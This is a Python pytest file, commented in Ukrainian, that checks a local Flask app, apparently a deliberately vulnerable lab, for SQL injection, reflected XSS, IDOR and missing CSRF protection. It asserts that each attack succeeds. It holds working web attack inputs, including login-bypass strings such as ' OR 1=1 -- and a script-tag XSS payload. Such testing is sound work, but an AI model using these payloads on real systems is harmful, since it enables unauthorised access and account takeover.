import requests
import pytest
import time
import threading
from app import app

BASE_URL = "http://localhost:5000"

@pytest.fixture(scope="session")
def flask_app():
    """Запускає Flask додаток для тестування"""
    # Запускаємо Flask у окремому потоці
    thread = threading.Thread(target=app.run, kwargs={'debug': False, 'use_reloader': False})
    thread.daemon = True
    thread.start()
    time.sleep(2)  # Чекаємо запуску
    yield
    # Після тестів зупиняємо (нічого не робимо, бо daemon thread)

def test_sql_injection_login(flask_app):
    """Тест на SQL Injection через форму логіну"""
    # Спроба обійти автентифікацію
    payload = {"username": "admin' --", "password": "anything"}
    response = requests.post(f"{BASE_URL}/login", data=payload)
    
    # Перевіряємо, чи атака вдалася (чи редірект на dashboard)
    assert response.url == f"{BASE_URL}/dashboard" or "Welcome" in response.text, \
        "SQL Injection вразливість не виявлена або її немає"
    

def test_xss_search(flask_app):
    """Тест на XSS через параметр пошуку"""
    xss_payload = "<script>alert('XSS')</script>"
    response = requests.get(f"{BASE_URL}/search", params={"q": xss_payload})
    
    # Перевіряємо, чи повертається скрипт без екранування
    assert xss_payload in response.text, \
        "XSS вразливість не виявлена (можливо виведення екранується)"
    
    # Також перевіряємо головну сторінку
    response2 = requests.get(f"{BASE_URL}", params={"name": xss_payload})
    assert xss_payload in response2.text, \
        "XSS на головній сторінці не виявлено"

def test_xss_api(flask_app):
    """Тест на XSS через API ендпоінт"""
    response = requests.get(f"{BASE_URL}/api/user/1")
    
    assert "<div>" in response.text, "API не повертає HTML"

def test_idor_transfer(flask_app):
    """Тест на IDOR - спроба переказу з чужого рахунку"""
    payload = {
        "from_account": "ACC1002",  # Чужий рахунок
        "to_account": "ACC9999",
        "amount": "1000"
    }
    
    # Спочатку треба залогінитися
    session = requests.Session()
    session.post(f"{BASE_URL}/login", data={"username": "user", "password": "userpass"})
    
    # Виконуємо переказ
    response = session.post(f"{BASE_URL}/transfer", data=payload)
    
    # Перевіряємо, чи транзакція пройшла
    assert "Transferred" in response.text, \
        "IDOR вразливість: переказ з чужого рахунку можливий"
    
    # Якщо тест пройшов - значить атака вдалася (додаток вразливий)

def test_csrf_admin(flask_app):
    """Тест на CSRF - зміна налаштувань без токену"""
    # У формі admin.html немає CSRF токену
    
    # Створюємо підроблений запит (імітуємо атаку)
    payload = {"site_name": "Hacked Site"}
    
    # Важливо: тут немає cookies, це імітує атаку з іншого сайту
    response = requests.post(f"{BASE_URL}/admin/update", data=payload)
    
    # Перевіряємо, чи зміни застосувалися
    assert "Site name updated to Hacked Site" in response.text, \
        "CSRF захист відсутній або є"
    
    # Якщо тест пройшов - значить атака вдалася (додаток вразливий)

def test_combined_sql_and_xss(flask_app):
    """Комбінований тест - SQL Injection для отримання даних + XSS"""
    # Отримуємо дані через SQL Injection
    payload = {"username": "' OR 1=1 --", "password": "anything"}
    response = requests.post(f"{BASE_URL}/login", data=payload, allow_redirects=False)
    
    # Перевіряємо чи є редірект (успішний логін)
    if response.status_code == 302:
        # Якщо вдалося залогінитися, значить SQL Injection працює
        print("SQL Injection успішний - можна отримати всіх користувачів")
        assert True
    else:
        assert False, "SQL Injection не спрацював"